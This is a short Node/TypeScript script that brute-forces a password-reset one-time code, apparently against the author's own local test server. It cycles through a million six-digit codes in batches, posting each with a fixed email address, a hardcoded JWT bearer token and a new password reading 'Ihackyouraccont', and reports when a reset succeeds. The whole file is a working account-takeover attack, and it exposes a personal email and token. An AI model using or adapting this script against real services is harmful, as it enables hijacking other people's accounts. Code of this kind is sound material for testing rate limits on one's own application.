const axios = require('axios');

async function sendRequest (otp:string) {
  let data = JSON.stringify({
    "email": "zakizaidi0709@gmail.com",
    "otp": otp,
    "newPassword": "Ihackyouraccont"
  });

  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/verify-otp',
    headers: { 
      'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2MjI5NWY3OC0zN2I4LTRjMWItOWZiMC0yYTFiM2E3MDMyZjIiLCJpYXQiOjE3Mzc3MzI5NzV9.uE6OIiNs8gG7qIT9csadYq61xuTZ1ePseam_CiZDIQo', 
      'Content-Type': 'application/json'
    },
    data : data
  };
  
  return axios.request(config)
  
}


async function main() {
  for(let i=0; i<1000000; i+=500) {
    console.log(i);
    let promisses = [];
    for(let j=i; j<500+i; j++) {
      promisses.push(sendRequest(j.toString()). then(res => {
        if(res.data.success) {
          console.log("Password reset succesfully")
          return
        }
      }).catch(e => {}))
      await Promise.all(promisses);    
    }
    
  }
}


main();



